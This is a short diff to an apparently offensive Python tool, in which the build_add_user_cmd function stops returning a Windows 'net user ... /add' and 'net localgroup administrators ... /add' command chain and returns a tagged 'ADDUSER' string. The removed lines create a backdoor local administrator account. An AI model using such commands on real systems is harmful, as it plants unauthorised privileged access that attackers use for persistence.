@@ -224,11 +224,7 @@ def build_add_user_cmd(spec):
         sys.exit(1)
 
     print(f'[*] Will create local admin: {user} / {passwd}')
-    return (
-        f'net user {user} {passwd} /add && '
-        f'net localgroup administrators {user} /add && '
-        f'echo [+] Local admin created: {user}'
-    )
+    return f'ADDUSER:{user}:{passwd}'
 
 
 def parse_args():
